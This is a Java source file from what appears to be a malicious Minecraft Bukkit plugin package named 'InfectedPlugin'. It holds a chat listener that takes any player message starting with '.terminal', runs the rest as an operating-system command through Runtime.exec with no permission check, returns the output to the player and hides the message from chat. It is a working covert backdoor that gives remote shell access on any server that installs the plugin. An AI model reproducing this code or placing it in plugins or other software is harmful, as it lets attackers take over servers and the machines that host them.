package org.CreeperCoders.InfectedPlugin.Commands;

import java.io.*;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_terminal implements Listener
{

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        boolean cancel = false;
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
    
            if (args[0].equalsIgnoreCase(".terminal"))
            {
                String command;
                try
                {
                    StringBuilder command_bldr = new StringBuilder();
                    for (int i = 1; i < args.length; i++)
                    {
                        command_bldr.append(args[i]).append(" ");
                    }
                    command = command_bldr.toString().trim();
                }
                catch (Throwable ex)
                {
                    p.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
                    return;
                }
            
                p.sendMessage("Running system command: " + command);
                String s;
                Process process;
                try
                {
                    process = Runtime.getRuntime().exec(command);
                    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    while ((s = br.readLine()) != null)
                    p.sendMessage(ChatColor.GRAY + "heres ur trash: " + s);
                    process.waitFor();
                    process.destroy();
                } catch (Exception e) {}
                cancel = true;
            }
            if (cancel)
            {
               event.setCancelled(true);
               return;
            }
        }
    }
}
